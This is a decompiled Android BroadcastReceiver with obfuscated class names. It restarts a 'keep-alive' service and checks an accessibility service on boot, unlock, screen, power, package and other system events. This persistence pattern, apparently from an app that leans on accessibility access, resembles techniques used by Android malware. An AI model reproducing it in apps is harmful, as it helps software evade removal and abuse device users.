package com.storm.safe.rock.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.storm.safe.rock.service.zgafaqvswksa;
import com.storm.safe.rock.util.AbstractC0385a0;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlinx.coroutines.AbstractC0780a0;
import p000.AbstractC1120qr;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class hkmpbrkewfy extends BroadcastReceiver {

    /* renamed from: a0 */
    public static final /* synthetic */ int f52723a0 = 0;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.service.hkmpbrkewfy$a0 */
    public static final class C0301a0 {
        public /* synthetic */ C0301a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        private C0301a0() {
        }
    }

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.hkmpbrkewfy$onReceive$1", m214403f = "hkmpbrkewfy.kt", m214404l = {45}, m214405m = "invokeSuspend")
    /* renamed from: com.storm.safe.rock.service.hkmpbrkewfy$onReceive$1 */
    public static final class C03021 extends SuspendLambda implements l10 {

        /* renamed from: a1 */
        public int f52724a1;

        /* renamed from: a3 */
        public final /* synthetic */ Context f52726a3;

        /* renamed from: a4 */
        public final /* synthetic */ String f52727a4;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        public C03021(Context context, String str, InterfaceC0876mv interfaceC0876mv) {
            super(2, interfaceC0876mv);
            this.f52726a3 = context;
            this.f52727a4 = str;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
            return hkmpbrkewfy.this.new C03021(this.f52726a3, this.f52727a4, interfaceC0876mv);
        }

        @Override // p000.l10
        public final Object invoke(Object obj, Object obj2) {
            return ((C03021) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Object invokeSuspend(Object obj) throws Throwable {
            C1351vv c1351vv = C1351vv.f60710b1;
            CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
            int i = this.f52724a1;
            if (i != 0) {
                if (i != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
                return c1351vv;
            }
            kg1.m213544f4(obj);
            Context context = this.f52726a3;
            this.f52724a1 = 1;
            int i2 = hkmpbrkewfy.f52723a0;
            try {
                try {
                    zgafaqvswksa.C0382a0.schedule$default(zgafaqvswksa.f55191a0, context, 0L, 2, null);
                } catch (Exception e) {
                    t60.m214705c6("hkmpbrkewfy", "❌ 启动保活服务失败", e);
                }
                try {
                    if (dqtvuisjd.f52358m1.getInstance() == null) {
                        t60.m214726f4("hkmpbrkewfy", "⚠️ 无障碍服务未运行，发送重启广播");
                    }
                } catch (Exception e2) {
                    t60.m214705c6("hkmpbrkewfy", "❌ 检查无障碍服务失败", e2);
                }
            } catch (Exception e3) {
                t60.m214705c6("hkmpbrkewfy", "❌ 处理服务重启失败", e3);
            }
            return c1351vv == coroutineSingletons ? coroutineSingletons : c1351vv;
        }
    }

    static {
        new C0301a0(null);
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        t60.m214695b6(context, "context");
        t60.m214695b6(intent, "intent");
        try {
            String action = intent.getAction();
            if (action != null) {
                switch (action.hashCode()) {
                    case -2128145023:
                        action.equals("android.intent.action.SCREEN_OFF");
                        return;
                    case -1980154005:
                        if (!action.equals("android.intent.action.BATTERY_OKAY")) {
                            return;
                        }
                        break;
                    case -1886648615:
                        if (!action.equals("android.intent.action.ACTION_POWER_DISCONNECTED")) {
                            return;
                        }
                        break;
                    case -1454123155:
                        if (!action.equals("android.intent.action.SCREEN_ON")) {
                            return;
                        }
                        break;
                    case -1181163412:
                        if (!action.equals("android.intent.action.DEVICE_STORAGE_LOW")) {
                            return;
                        }
                        break;
                    case -1076576821:
                        if (action.equals("android.intent.action.AIRPLANE_MODE")) {
                            break;
                        } else {
                            return;
                        }
                    case -810471698:
                        if (!action.equals("android.intent.action.PACKAGE_REPLACED")) {
                            return;
                        }
                        break;
                    case -730838620:
                        if (!action.equals("android.intent.action.DEVICE_STORAGE_OK")) {
                            return;
                        }
                        break;
                    case -436407866:
                        if (!action.equals("com.storm.safe.rock.intent.RESTART_SERVICES")) {
                            return;
                        }
                        break;
                    case -19011148:
                        if (!action.equals("android.intent.action.LOCALE_CHANGED")) {
                            return;
                        }
                        break;
                    case 490310653:
                        if (!action.equals("android.intent.action.BATTERY_LOW")) {
                            return;
                        }
                        break;
                    case 502473491:
                        if (!action.equals("android.intent.action.TIMEZONE_CHANGED")) {
                            return;
                        }
                        break;
                    case 798292259:
                        if (!action.equals("android.intent.action.BOOT_COMPLETED")) {
                            return;
                        }
                        break;
                    case 823795052:
                        if (!action.equals("android.intent.action.USER_PRESENT")) {
                            return;
                        }
                        break;
                    case 1019184907:
                        if (!action.equals("android.intent.action.ACTION_POWER_CONNECTED")) {
                            return;
                        }
                        break;
                    case 1544582882:
                        if (!action.equals("android.intent.action.PACKAGE_ADDED")) {
                            return;
                        }
                        break;
                    case 1737074039:
                        if (!action.equals("android.intent.action.MY_PACKAGE_REPLACED")) {
                            return;
                        }
                        break;
                    default:
                        return;
                }
                AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, null, new C03021(context, action, null), 3);
            }
        } catch (Exception e) {
            t60.m214705c6("hkmpbrkewfy", "❌ 处理系统事件失败", e);
        }
    }
}
